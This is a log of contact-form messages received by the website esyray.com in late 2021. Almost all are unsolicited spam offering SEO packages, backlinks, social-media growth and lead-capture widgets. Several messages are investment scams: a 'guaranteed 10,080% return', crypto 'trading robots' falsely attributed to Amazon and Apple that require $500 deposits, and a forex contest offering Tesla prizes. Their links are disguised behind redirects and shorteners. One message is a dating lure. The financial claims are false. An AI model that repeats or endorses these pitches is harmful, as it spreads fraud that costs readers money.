+++ 2021-09-23 04:52:08 AM -- Email from: Philipwak, -- subject: The digital world: its advantages for revenue. Invest $ 257 and get passive income of $ 4900 per day, -- email: philippe.georges@hotmail.fr, -- Message is: How I Earn $1500 A Day - Passive Income   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc5TErp&amp;sa=D&amp;jc=4k&amp;usg=AFQjCNGER3suzFXrVfFj8alSN_WnyidwBQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-09-23 07:18:06 AM -- Email from: WTE, -- subject: Invest $250K and earn $25M within 360 days without investment risks, -- email: info@100xroi.org, -- Message is: You can turn a $250K investment into $25M in income within 360 days by investing in the 100X investment account. The 100X investment account offers you a guaranteed 10,080% return on investment within 360 days without risks. Your investment is secured through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn    esyray.com
+++ 2021-09-23 07:18:30 AM -- Email from: WTE, -- subject: Invest $500K and earn $50M within 360 days without investment risks, -- email: info@100xroi.org, -- Message is: You can turn a $500K investment into $50M in income within 360 days by investing in the 100X investment account. The 100X investment account offers you a guaranteed 10,080% return on investment within 360 days without risks. Your investment is secured through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn    esyray.com
+++ 2021-09-23 07:22:27 AM -- Email from: WTE, -- subject: How to Make a 10,080% return on investment within 360 days without investment risks, -- email: info@100xroi.org, -- Message is: You can make a 10,080% return on investment within 360 days by investing in the 100X investment account at https://bit.ly/3m4uJOj .  The 100X investment account offers you a guaranteed 10,080% return on investment within 360 days without risks. Your investment is secured through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn    esyray.com
+++ 2021-09-23 07:22:38 AM -- Email from: WTE, -- subject: Invest $100K and earn $10M within 360 days without investment risks, -- email: info@100xroi.org, -- Message is: You can turn a $100K investment into $10M in income within 360 days by investing in the 100X investment account. The 100X investment account offers you a guaranteed 10,080% return on investment within 360 days without risks. Your investment is secured through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn    esyray.com
+++ 2021-09-23 07:25:41 AM -- Email from: WTE, -- subject: Invest $10M and earn $1B within 360 days without investment risks, -- email: info@100xroi.org, -- Message is: You can turn a $10M investment into $1B in income within 360 days by investing in the 100X investment account. The 100X investment account offers you a guaranteed 10,080% return on investment within 360 days without risks. Your investment is secured through the WTE investment protection program. Your 10,000% return on investment is 100% guaranteed through the Guaranteed ROI program. To learn more about the 100X investment account, go to https://bit.ly/37L0H9F now. To your success, Jason Brian. https://bit.ly/37L0H9Fn    esyray.com
+++ 2021-09-23 08:55:38 AM -- Email from: Natalie, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-09-23 06:20:39 PM -- Email from: Natalie, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-09-24 03:53:54 PM -- Email from: Philipwak, -- subject: Passives Online-Einkommen ab 600 EUR pro Stunde, -- email: mariefrancefraticelli@wanadoo.fr, -- Message is: Way To Earn $334000 Per Week In Passive Income   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc5TErp&amp;sa=D&amp;h1=gk&amp;usg=AFQjCNGER3suzFXrVfFj8alSN_WnyidwBQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-09-25 05:14:38 AM -- Email from: Mike Bawerman, -- subject: Increase sales for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Hi there 
 
Do you want a quick boost in ranks and sales for your esyray.com website? 
Having a high DA score, always helps 
 
Get your esyray.com to have a DA between 50 to 60 points in Moz with us today and reap the benefits of such a great feat. 
 
See our offers here: 
https://www.monkeydigital.co/product/moz-da50-seo-plan/ 
 
NEW: 
https://www.monkeydigital.co/product/ahrefs-dr60/ 
 
 
thank you 
Mike Bawerman
 
support@monkeydigital.co
+++ 2021-09-25 12:58:01 PM -- Email from: Jo Oliphant, -- subject: , -- email: jo.oliphant49@hotmail.com, -- Message is: 100% free backlink strategy you can use to improve your website's SEO pretty easily yourself. Check it out: https://1mdr.short.gy/iJEc6x
+++ 2021-09-25 10:43:06 PM -- Email from: Natalie Turner, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-09-25 11:45:42 PM -- Email from: Natalie Turner, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-09-26 07:42:57 AM -- Email from: Philipwak, -- subject: Passives Online-Einkommen ab 600 EUR pro Stunde, -- email: marine.grenouiller@hotmail.fr, -- Message is: Das Geheimnis von Elon Musks Superprofiten in Kryptowahrung wird geluftet   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc5TErp&amp;sa=D&amp;tj=ld&amp;usg=AFQjCNGER3suzFXrVfFj8alSN_WnyidwBQ   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-09-26 12:16:36 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-09-28 02:28:59 AM -- Email from: Mike Andrews, -- subject: Local SEO for more business, -- email: no-replydrype@gmail.com, -- Message is: Greetings 
 
We will improve your Local Ranks organically and safely, using only whitehat methods, while providing Google maps and website offsite work at the same time. 
 
Please check our plans here, we offer Local SEO at cheap rates. 
https://speed-seo.net/product/local-seo-package/ 
 
NEW: 
https://www.speed-seo.net/product/zip-codes-gmaps-citations/ 
 
regards 
Mike Andrews
 
Speed SEO Digital Agency
+++ 2021-09-28 12:03:04 PM -- Email from: Darby Marturano, -- subject: Bernie Ruwe, -- email: RomanPiela@gmail.com, -- Message is: How To Advertise Online Without Paying A Dime http://www.congreso-hidalgo.gob.mx/urls/7Dw
+++ 2021-09-28 10:54:20 PM -- Email from: Colleen Hansen, -- subject: Finance Your Business with Government-backed Grants, -- email: chanokformsen@gmail.com, -- Message is: Explore government-backed grants and funding programs for your business! APPLY NOW - https://rebrand.ly/USAGOV-SmallBusiness-Grants
+++ 2021-09-29 10:34:34 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-09-30 06:48:02 AM -- Email from: Jamila Tenorio, -- subject: jamila.tenorio@hotmail.com, -- email: qlouk@taikz.com, -- Message is: It is actually possible to promote your website nowdays without paying huge advertising costs. Check it out:  https://cutt.ly/qEzgoFV
+++ 2021-09-30 02:09:14 PM -- Email from: Chrissy Allan, -- subject: Voice Search, -- email: chrissy@youralexadirectory.link, -- Message is: Hello, we need some additional information regarding your business to be registered on Amazon Alexa and Siri (iPhones) so people can find your company using Voice Search. 

There are more then 31,500 Voice Searches being done every second, wouldn't you agree its time to get your fair share of those searches?

Its simple &amp; easy; Register your business here --&gt; 
https://voiceregbiz1.xyz/mroe-cusotmers/?=esyray.com


Chrissy
Voice Activation Follow-up Specialist
Your Alexa Directory



 
2764 Pleasant Road Suite Suite A PMB 708
Fort Mill, SC 29708

You can skip future marketing messages here:
https://voiceregbiz1.xyz/unsubscribe.php/?site=esyray.com
+++ 2021-09-30 03:36:00 PM -- Email from: Levi Kerr, -- subject: How to get 10,000 interested people to your website in one week, -- email: lkerr0314@gmail.com, -- Message is: Hi,

Would you like 10,000 people coming to your website in one week?
Ones who are interested as it is ther choice.

Everyone interested will come from online publications in the catgory of your choice via
popups on those sites. For instance the category womens interest would come from
Cosmoplitan, Vogue etc...High profile sources will be in your niche used for your campaign.
You give final approval before 
(peope not segmented by city or state - national only)

Our service is like no other.

We look forward to see you on our site and in having you one of our hundreds of repeat customers.

Best,
Levi K.
https://traffic-stampede.com
+++ 2021-10-01 02:53:47 AM -- Email from: Roxanna Reinhart, -- subject: Your 2000 Facebook Likes for Contact Us, -- email: reinhart.roxanna@yahoo.com, -- Message is: Are you coming?

Paying importance to your online marketing throughout the internet is crucial to stay visible to any potential new customers.

To sky rocket your esyray.com effortlessly on the web you need this impressive service:
	
https://geeks-marketing.com/socialsignals


Warm regards,
We offer the very best Digital Marketing services you may find on our shop for making big money in a small business, still not considering getting new clients? Here is a quick, one-click unsubscribe link: https://geeks-marketing.com/?unsubscribe=esyray.com
+++ 2021-10-01 04:43:09 AM -- Email from: Natalie Turner, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-10-01 08:15:49 PM -- Email from: Natalie, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-10-02 03:15:09 AM -- Email from: Gussie Klein, -- subject: Aaron Morway, -- email: AlphonseKocourek@gmail.com, -- Message is: 50 Ways To Advertise Your Business For Free On The Internet http://www.congreso-hidalgo.gob.mx/urls/7Dw
+++ 2021-10-02 04:08:11 AM -- Email from: Gregoryadept, -- subject: Amazon offers everyone a passive income of $ 15,000 per week, -- email: jessica.fritts13@gmail.com, -- Message is: Amazon, together with the companies Euronext and Norton, have developed a smart system for generating passive income from the difference between cryptocurrencies, including Bitcoin. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc6jWfc&amp;sa=D&amp;7e=zd&amp;usg=AFQjCNHdwHGe2DxgDiPDujhsvUic-IZkjA 
 
Now you can also receive passive income from $ 15,000 per week without doing anything and without having any skills. 
 
Act now, register and launch the system and by the end of next week you will have more than $ 25,000 in your account. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc6jWfc&amp;sa=D&amp;ww=z6&amp;usg=AFQjCNHdwHGe2DxgDiPDujhsvUic-IZkjA
+++ 2021-10-03 12:12:09 AM -- Email from: Antje Cosh, -- subject: Hey, -- email: antje.cosh@gmail.com, -- Message is: Hey, I'm George and I have noticed your site is loading very slow and there are a lot of things you can do you improve your site speed such as:
- Reducing image sizes
- Implementing a better cache for static content, database and dynamic queries
- Remove content load blocking scripts and CSS
- And much more...

I am willing to do all of these things for you for FREE and gurantee that you will get at least 85+ score on Google Page Speed checker which will enhance your SEO &amp; let your visitors see your great site much faster than now.

Why am I doing this? Because I am proffesional website speed optimization expert and I would like to get as many honest, real reviews on my service.

To give you the best experience, I have partnered with the fastest, WordPress managed Cloud server in the world, because everyone knows a great server makes all the difference when it comes to page load speed optimization.

So I will:
- Increase your site speed
- Reduce your WordPress server costs

For free and you don't need to do anything! I will walk you though the whole proccess...

For more info check;
https://l.bestsellers.to/ksph
+++ 2021-10-04 04:32:40 AM -- Email from: JordanTwent - Apple, -- subject: Apple Offers Passive Income From $ 5,000 A Week To Everyone, -- email: augustinlebarbier@gmail.com, -- Message is: Apple has developed the latest AI-based trading robot that makes more than 90% of successful transactions in cryptocurrency trading. 
 
You are guaranteed to receive from $ 5000 per week of passive income while your trading robot is working 24/7. 
 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc6jWfc&amp;sa=D&amp;ab=b4&amp;usg=AFQjCNHdwHGe2DxgDiPDujhsvUic-IZkjA 
 
You don't need any skills. 
 
To get started, you need to take the following steps: 
 
1. Register on the website of our trading robot https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc6jWfc&amp;sa=D&amp;vl=4g&amp;usg=AFQjCNHdwHGe2DxgDiPDujhsvUic-IZkjA 
 
2. Top up the balance in your personal account for at least $ 500 
 
3. Launch a trading robot 
 
4. Watch how your account balance grows 
 
5. Withdraw profit every week 
 
6. Enjoy life
+++ 2021-10-04 09:57:42 PM -- Email from: Nannie Tauchert, -- subject: , -- email: bmostafa.el@jeruknipis.buzz, -- Message is: High quality, niche targeted traffic starting at only $39 for 3000 guaranteed visitors:  https://goolnk.com/QgnjlE
+++ 2021-10-05 02:54:04 PM -- Email from: Mike Ogden, -- subject: quality monthly SEO plans, -- email: no-replydrype@gmail.com, -- Message is: Greetings 
 
I have just checked  esyray.com for  the current search visibility and saw that your website could use a push. 
 
We will enhance your SEO metrics and ranks organically and safely, using only whitehat methods, while providing monthly reports and outstanding support. 
 
Please check our services below, we offer SEO at cheap rates. 
https://www.hilkom-digital.de/cheap-seo-packages/ 
 
Start enhancing your sales and leads with us, today! 
 
regards 
Mike Ogden
 
Hilkom Digital Team 
support@hilkom-digital.de
+++ 2021-10-05 10:47:56 PM -- Email from: Aida Loughman, -- subject: GET PROFESSIONALLY VIDEOS AT AFFORDABLE PRICES, -- email: loughman.aida@googlemail.com, -- Message is: GET PROFESSIONALLY VIDEOS AT AFFORDABLE PRICES

We offer professionally produced videos at affordable prices.
Our videos have the look and feel of a high quality television commercial, complete with professional spokesperson, background, text, 
images, logos, music and of course, most importantly, your company’s contact information for your esyray.com.

If you’re ready to reach more clients today, let us get to work on producing your company’s exclusive video.
MORE INFO=&gt;  http://qejn39630.bloggerbags.com/8235109/get-videos-at-affordable-prices
+++ 2021-10-06 04:21:54 AM -- Email from: Philipwak, -- subject: It’s not convenient out here. Why don’t we chat there -, -- email: annamaria.rogberg@spray.se, -- Message is: Ich bin abends frei und mцchte etwas trinken. Siehe meine Telefonnummer im Profil auf der Website   &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;  https://www.google.com/url?q=https%3A%2F%2Fhot-girls-here.com%2FZsd9gYcd&amp;sa=D&amp;mf=9p&amp;usg=AFQjCNH1cFMpf5xulRS_ME8x6B8wpeKUyw   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;
+++ 2021-10-06 05:25:16 AM -- Email from: Mike Foster, -- subject: Get more dofollow backlinks for esyray.com, -- email: no-replydrype@gmail.com, -- Message is: Hello 
 
We all know the importance that dofollow link have on any website`s ranks. 
Having most of your linkbase filled with nofollow ones is of no good for your ranks and SEO metrics. 
 
Buy quality dofollow links from us, that will impact your ranks in a positive way 
https://www.digital-x-press.com/product/150-dofollow-backlinks/ 
 
Best regards 
Mike Foster
 
support@digital-x-press.com
+++ 2021-10-07 12:42:44 AM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-10-07 03:47:34 PM -- Email from: Eric Jones, -- subject: how to turn eyeballs into phone calls, -- email: eric.jones.z.mail@gmail.com, -- Message is: Hi, Eric here with a quick thought about your website esyray.com...

I’m on the internet a lot and I look at a lot of business websites.

Like yours, many of them have great content. 

But all too often, they come up short when it comes to engaging and connecting with anyone who visits.

I get it – it’s hard.  Studies show 7 out of 10 people who land on a site, abandon it in moments without leaving even a trace.  You got the eyeball, but nothing else.

Here’s a solution for you…

Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  You’ll know immediately they’re interested and you can call them directly to talk with them literally while they’re still on the web looking at your site.

CLICK HERE https://talkwithwebvisitors.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

It could be huge for your business – and because you’ve got that phone number, with our new SMS Text With Lead feature, you can automatically start a text (SMS) conversation – immediately… and contacting someone in that 5 minute window is 100 times more powerful than reaching out 30 minutes or more later.

Plus, with text messaging you can follow up later with new offers, content links, even just follow up notes to keep the conversation going.

Everything I’ve just described is extremely simple to implement, cost-effective, and profitable. 
 
CLICK HERE https://talkwithwebvisitors.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more eyeballs into leads today!

Eric
PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE https://talkwithwebvisitors.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithwebvisitors.com/unsubscribe.aspx?d=esyray.com
+++ 2021-10-08 06:50:52 PM -- Email from: Eric Jones, -- subject: Cool website!, -- email: eric.jones.z.mail@gmail.com, -- Message is: Cool website!

My name’s Eric, and I just found your site - esyray.com - while surfing the net. You showed up at the top of the search results, so I checked you out. Looks like what you’re doing is pretty cool.
 
But if you don’t mind me asking – after someone like me stumbles across esyray.com, what usually happens?

Is your site generating leads for your business? 
 
I’m guessing some, but I also bet you’d like more… studies show that 7 out 10 who land on a site wind up leaving without a trace.

Not good.

Here’s a thought – what if there was an easy way for every visitor to “raise their hand” to get a phone call from you INSTANTLY… the second they hit your site and said, “call me now.”

You can –
  
Talk With Web Visitor is a software widget that’s works on your site, ready to capture any visitor’s Name, Email address and Phone Number.  It lets you know IMMEDIATELY – so that you can talk to that lead while they’re literally looking over your site.

CLICK HERE http://talkwithcustomer.com to try out a Live Demo with Talk With Web Visitor now to see exactly how it works.

Time is money when it comes to connecting with leads – the difference between contacting someone within 5 minutes versus 30 minutes later can be huge – like 100 times better!

That’s why we built out our new SMS Text With Lead feature… because once you’ve captured the visitor’s phone number, you can automatically start a text message (SMS) conversation.
  
Think about the possibilities – even if you don’t close a deal then and there, you can follow up with text messages for new offers, content links, even just “how you doing?” notes to build a relationship.

Wouldn’t that be cool?

CLICK HERE http://talkwithcustomer.com to discover what Talk With Web Visitor can do for your business.

You could be converting up to 100X more leads today!
Eric

PS: Talk With Web Visitor offers a FREE 14 days trial – and it even includes International Long Distance Calling. 
You have customers waiting to talk with you right now… don’t keep them waiting. 
CLICK HERE http://talkwithcustomer.com to try Talk With Web Visitor now.

If you'd like to unsubscribe click here http://talkwithcustomer.com/unsubscribe.aspx?d=esyray.com
+++ 2021-10-09 04:26:27 PM -- Email from: Tiffani Mireles, -- subject: , -- email: acobirag-5832@yopmail.com, -- Message is: Now you can buy web traffic that comes with a money back guarantee! It costs 1/10th the price of Google and can be targeted by keywords. Check it out: https://tinyurl.com/aa6jzz5n
+++ 2021-10-10 05:17:34 AM -- Email from: Angeles Benny, -- subject: Attention: Your Backlinks - esyray.com, -- email: angeles.benny@gmail.com, -- Message is: Quick Question?

Internet traffic is free. Being able to consistently receive targeted clients to esyray.com will undeniably increase your leads and sales.

To sky rocket your company efficiently over the web you should have this fantastic service:
	
https://first-class-promotion.com/backlinks-generator


With best regards,
We offer amazing Online Marketing services you can order on our shop for making big money in a small business, still not interested in getting new customers? Here is a straightforward, 1-click unsubscribe link: https://first-class-promotion.com/?unsubscribe=esyray.com
+++ 2021-10-10 06:44:11 AM -- Email from: RogerWrony, -- subject: Trade Forex &amp; Win Tesla Model 3 - 100 Cars Drawn, -- email: sperally@yahoo.se, -- Message is: Trade Forex &amp; Win Tesla Model 3 - 100 Cars Drawn 
 
Hello dear subscriber. Now you have every chance to win a new Tesla Model 3 car - https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc6IjTY&amp;sa=D&amp;598=628&amp;usg=AFQjCNFcCi_AW0KZy1-k7bYu2x-9Vy_TAQ 
To participate in the promotion, you need to take three simple steps: 
1. Register on our website - https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc6IueF&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGcfsC5yehR_jdJlkas6Es4v5B7VQ 
2. In your personal account, make a deposit of at least $ 500 
3. Launch a trading robot (your personal manager will help you) 
4. Now every day until October 31, inclusive, you will need to enter your personal account and see how much the robot has traded. 
The essence of the competition is to whom the trading robot earned the most money. The percentage of successful deals is from 60%, so you will be in the black anyway. The winners will be determined on November 1. 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc6IueF&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGcfsC5yehR_jdJlkas6Es4v5B7VQ 
Hurry up to register and complete all the steps to participate in the competition - the number of participants is growing every day. 
https://www.google.com/url?q=https%3A%2F%2Fvk.cc%2Fc6IueF&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGcfsC5yehR_jdJlkas6Es4v5B7VQ
+++ 2021-10-10 11:05:47 AM -- Email from: Jenny, -- subject: Best Ad Network For Publishers And Bloggers In 2021, -- email: jenny@foremedia.net, -- Message is: Hey, I visited your site and I think that your content is amazing! It is really engaging and original, you must have worked so hard to generate such a quality content. We are ForeMedia and we help website owners with great websites to maximize the revenue they make from their website. I would love to buy Ad Spaces on your website and pay you per each impression of the ads on your site. We are Google Ad Exchange Premium partners and we work with more than 100 Ad Network &amp; thousands of premium direct advertisers who would LOVE to buy Ads directly from your site and we can guarantee to increase your revenue by at least 45% compared to other advertising solutions you are currently using. You deserve to earn more for your content and maximize your earning potential and I will help you unlock that potential! There is no cost, you can register to our monetization platform for free on this link: https://foremedia.net/start I will be available for you on the Live Chat if you need any help, or you can email me back to: jenny@foremedia.net if you have any questions. I have at least 17 Premium Advertisers that have asked me to approach you because they would like to advertise on your website on Premium eCPM [cost per impressions] basis. Have a good day &amp; feel free to ping me for any question! Click the link here for 1 minute registration to our platform [it's free!]: https://go.foremedia.net/u/start/
+++ 2021-10-12 12:43:35 AM -- Email from: Natalie, -- subject: Introduction, -- email: natalie@socialgrowthengine.com, -- Message is: Have you felt like there's no way out of the social media marketing rut? We are here to help grow your business with 100% human powered services. Our company specializes in helping photographers who aim for perfection and love being found on Instagram!

You need more followers and engagement? Look no further than the Instagram Growth Engine PRO - https://socialgrowthengine.com/collections/instagram?rfsn=6024360.c037b7a
+++ 2021-10-12 03:40:37 AM -- Email from: Layne Birtwistle, -- subject: , -- email: birtwistle.layne@gmail.com, -- Message is: {Hi|Hello) ,
I came across your site esyray.com and I was wondering if you would like to test our whatsapp chat bot to automate your support &amp; lead gen process?

Chat bots can provide your clients with :
1. 24/7 Customer support
2. Auto-response for Frequently Asked Questions
3. Increase user engagement
4. Automatic Lead-gen

According to Forbes magazine businesses are able to increase their revenue by up to 67% with chat-bots.
https://www.forbes.com/sites/gilpress/2019/11/25/ai-stats-news-chatbots-increase-sales-by-67-but-87-of-consumers-prefer-humans/

Our chats bot benefits:

- Bulk Messaging
- Chatbot
- Multi Agent WhatsApp Web
- Triggers &amp; Automation
- API to WhatsApp - from Zapier, Integromat and Webhooks
- Statistics
- Customer List Management &amp; Marketing

Currently, starting to use it is free for 14 days only, so don't miss your chance to give it a try: 
https://l.bestsellers.to/kscb
+++ 2021-10-13 12:33:22 AM -- Email from: Oliver Poulson, -- subject: Rank your Youtube videos and get more $$$, -- email: poulson.oliver@yahoo.com, -- Message is: Hi there
How would you like to grab more visibility for your YT videos at no advertisment costs.
All organically

We have built a special plan for ranking YT videos, check it out here:
https://www.seo-treff.de/product/youtube-seo-package/

Thanks and regards

Michel
support@seo-treff.de
